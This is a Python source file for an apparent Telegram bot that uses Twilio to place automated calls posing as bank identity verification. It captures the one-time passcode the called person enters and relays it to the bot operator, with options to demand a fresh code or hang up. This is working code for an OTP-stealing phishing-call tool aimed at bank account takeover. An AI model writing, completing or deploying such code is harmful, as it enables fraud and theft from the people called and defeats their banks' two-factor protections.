import os
import logging
import time
import redis
from twilio.rest import Client
from twilio.twiml.voice_response import VoiceResponse
import phonenumbers
from urllib.parse import urlparse

class TwilioHandler:
    def __init__(self, bot, call_utils):
        self.bot = bot
        self.call_utils = call_utils
        self.active_calls = {}
        self.client = Client(
            os.getenv("TWILIO_ACCOUNT_SID"),
            os.getenv("TWILIO_AUTH_TOKEN")
        )
        self.TWILIO_PHONE_NUMBER = os.getenv("TWILIO_PHONE_NUMBER")
        self.TWILIO_FUNCTION_URL = os.getenv("TWILIO_FUNCTION_URL")
        self.REDIS_SOCKET_TIMEOUT = 5

    def create_redis_client(self):
        try:
            redis_url = os.getenv("REDIS_URL")
            if not redis_url:
                logging.error("REDIS_URL environment variable is not set.")
                return None

            redis_client = redis.Redis.from_url(
                redis_url,
                decode_responses=True,
                socket_timeout=self.REDIS_SOCKET_TIMEOUT,
                socket_connect_timeout=self.REDIS_SOCKET_TIMEOUT,
                retry_on_timeout=True,
                max_connections=20,
                ssl_cert_reqs=None
            )
            redis_client.ping()
            return redis_client
        except Exception as e:
            logging.error(f"Redis connection error: {e}")
            return None

    def validate_phone_number(self, phone_number):
        try:
            parsed_number = phonenumbers.parse(phone_number)
            return phonenumbers.is_valid_number(parsed_number)
        except phonenumbers.phonenumberutil.NumberParseException:
            return False

    def handle_phone_number(self, message, recipient_name, bank_name, service_name):
        chat_id = message.chat.id
        phone_number = message.text.strip()

        if not self.validate_phone_number(phone_number):
            self.bot.send_message(
                chat_id,
                "❌ Invalid phone number format.\n"
                "Please use international format: +[country_code][number]"
            )
            return

        status_message = self.bot.send_message(chat_id, "🔄 Initiating verification call...")
        redis_client = self.create_redis_client()

        if redis_client is None:
            self.bot.edit_message_text(
                "❌ Redis connection failed. Please try again.",
                chat_id=chat_id,
                message_id=status_message.message_id
            )
            return

        try:
            temp_call_id = f"temp_{int(time.time())}"
            redis_client.hset(f'call_info:{temp_call_id}', mapping={
                'recipient_name': recipient_name,
                'bank_name': bank_name,
                'phone_number': phone_number
            })

            response = VoiceResponse()
            response.redirect(f"{self.TWILIO_FUNCTION_URL}?temp_id={temp_call_id}")

            call = self.client.calls.create(
                to=phone_number,
                from_=self.TWILIO_PHONE_NUMBER,
                twiml=str(response),
                status_callback=self.TWILIO_FUNCTION_URL,
                status_callback_event=["initiated", "ringing", "answered", "completed"]
            )

            redis_client.hset(f'call_info:{call.sid}', mapping={
                'recipient_name': recipient_name,
                'bank_name': bank_name,
                'phone_number': phone_number
            })

            redis_client.delete(f'call_info:{temp_call_id}')

            max_wait_time = 120
            start_time = time.time()
            call_status = call.status
            last_status = None
            otp_code = None
            otp_displayed = False

            while time.time() - start_time <= max_wait_time and call_status not in ['completed', 'busy', 'failed', 'no-answer', 'canceled']:
                try:
                    call = self.client.calls(call.sid).fetch()
                    call_status = call.status

                    if not otp_displayed:
                        otp_code = redis_client.get(f"otp:{call.sid}")
                        if otp_code:
                            verification_text = (
                                f"📱 *Verification Code Received*\n\n"
                                f"👤 Recipient: `{recipient_name}`\n"
                                f"🏦 Bank: `{bank_name}`\n"
                                f"📱 Number: `{phone_number}`\n"
                                f"🔑 Code: `{otp_code}`\n"
                                f"🕒 Time: {time.strftime('%H:%M:%S')}"
                            )
                            self.bot.edit_message_text(
                                verification_text,
                                chat_id=chat_id,
                                message_id=status_message.message_id,
                                parse_mode="Markdown",
                                reply_markup=self.call_utils.create_verification_keyboard(call.sid)
                            )
                            otp_displayed = True
                            redis_client.delete(f"otp:{call.sid}")

                    if call_status != last_status:
                        if call_status == 'completed':
                            final_text = (
                                f"📱 *Call Completed*\n\n"
                                f"👤 Recipient: `{recipient_name}`\n"
                                f"🏦 Bank: `{bank_name}`\n"
                                f"📱 Number: `{phone_number}`\n"
                                f"🔑 Final Code: `{otp_code if otp_code else 'Not provided'}`\n"
                                f"✅ Status: *Completed*\n"
                                f"🕒 Time: {time.strftime('%H:%M:%S')}"
                            )
                            self.bot.edit_message_text(
                                final_text,
                                chat_id=chat_id,
                                message_id=status_message.message_id,
                                parse_mode="Markdown"
                            )
                        else:
                            status_emoji = self.call_utils.status_emojis.get(call_status, '🔄')
                            self.bot.edit_message_text(
                                f"📱 *Call Status Update*\n\n"
                                f"ID: `{call.sid}`\n"
                                f"Status: {status_emoji} *{call_status.title()}*\n"
                                f"Phone: `{phone_number}`\n"
                                f"Time: {time.strftime('%H:%M:%S')}",
                                chat_id=chat_id,
                                message_id=status_message.message_id,
                                parse_mode="Markdown",
                                reply_markup=self.call_utils.create_hangup_keyboard(call.sid)
                            )
                        last_status = call_status

                except Exception as e:
                    logging.error(f"Error fetching call status: {e}")
                    continue

                time.sleep(2)

            if not otp_displayed:
                self.bot.edit_message_text(
                    "⏱ Call verification timed out.",
                    chat_id=chat_id,
                    message_id=status_message.message_id
                )

        except Exception as e:
            self.bot.edit_message_text(
                f"❌ Error during verification: {str(e)}",
                chat_id=chat_id,
                message_id=status_message.message_id
            )
        finally:
            if redis_client:
                redis_client.close()

    def handle_verification_accept(self, call):
        chat_id = call.message.chat.id
        call_sid = call.data.split("_")[2]
        try:
            call = self.client.calls(call_sid).update(
                twiml='<Response><Say voice="Polly.Joanna">Thank you for verifying your identity. Goodbye.</Say><Hangup/></Response>'
            )
            self.bot.edit_message_text(
                "✅ Verification accepted. Call completed.",
                chat_id=chat_id,
                message_id=call.message.message_id
            )
        except Exception as e:
            self.bot.send_message(chat_id, f"❌ Error accepting verification: {str(e)}")

    def handle_verification_decline(self, call):
        chat_id = call.message.chat.id
        call_sid = call.data.split("_")[2]
        message_id = call.message.message_id

        try:
            redis_client = self.create_redis_client()
            if redis_client:
                redis_client.delete(f"otp:{call_sid}")

            call = self.client.calls(call_sid).update(
                url=f"{self.TWILIO_FUNCTION_URL}?isReverification=true",
                method='POST'
            )

            self.bot.edit_message_text(
                "🔄 Verification declined. Requesting new code...",
                chat_id=chat_id,
                message_id=message_id,
                reply_markup=self.call_utils.create_hangup_keyboard(call_sid)
            )

            max_wait_time = 120
            start_time = time.time()
            otp_displayed = False

            while time.time() - start_time <= max_wait_time and not otp_displayed:
                try:
                    if redis_client:
                        new_otp = redis_client.get(f"otp:{call_sid}")
                        if new_otp:
                            call_info = redis_client.hgetall(f'call_info:{call_sid}')
                            verification_text = (
                                f"📱 *New Verification Code Received*\n\n"
                                f"👤 Recipient: `{call_info.get('recipient_name', 'N/A')}`\n"
                                f"🏦 Bank: `{call_info.get('bank_name', 'N/A')}`\n"
                                f"🔑 Code: `{new_otp}`\n"
                                f"🕒 Time: {time.strftime('%H:%M:%S')}"
                            )
                            self.bot.edit_message_text(
                                verification_text,
                                chat_id=chat_id,
                                message_id=message_id,
                                parse_mode="Markdown",
                                reply_markup=self.call_utils.create_verification_keyboard(call_sid)
                            )
                            redis_client.delete(f"otp:{call_sid}")
                            otp_displayed = True
                            break
                except Exception as e:
                    logging.error(f"Error monitoring re-verification: {e}")
                    continue
                time.sleep(2)

            if not otp_displayed:
                self.bot.edit_message_text(
                    "⏱ Re-verification timed out.",
                    chat_id=chat_id,
                    message_id=message_id
                )

        except Exception as e:
            self.bot.send_message(chat_id, f"❌ Error during re-verification: {str(e)}")
        finally:
            if redis_client:
                redis_client.close()

    def handle_hangup(self, call):
        chat_id = call.message.chat.id
        call_sid = call.data.split("_")[1]
        try:
            call = self.client.calls(call_sid).update(status="completed")
            self.bot.send_message(chat_id, "📞 Call has been ended.")
        except Exception as e:
            self.bot.send_message(chat_id, f"❌ Error hanging up call: {str(e)}")

    def handle_call_callbacks(self, call):
        if call.data.startswith("verify_accept_"):
            self.handle_verification_accept(call)
        elif call.data.startswith("verify_decline_"):
            self.handle_verification_decline(call)
        elif call.data.startswith("hangup_"):
            self.handle_hangup(call)
        elif call.data.startswith("cancel_call_"):
            self.handle_cancel_call(call)

    def handle_cancel_call(self, call):
        chat_id = call.message.chat.id
        call_sid = call.data.split("_")[2]
        try:
            call = self.client.calls(call_sid).fetch()
            if call.status not in ['completed', 'canceled', 'failed']:
                call.update(status='canceled')
                self.bot.send_message(chat_id, f"🚫 Call with ID `{call_sid}` has been cancelled.")
            else:
                self.bot.send_message(chat_id, f"⚠️ Call with ID `{call_sid}` is already {call.status}.")

            if chat_id in self.active_calls and self.active_calls[chat_id].get('call_sid') == call_sid:
                del self.active_calls[chat_id]

        except Exception as e:
            self.bot.send_message(chat_id, f"❌ Error cancelling call `{call_sid}`: {str(e)}")
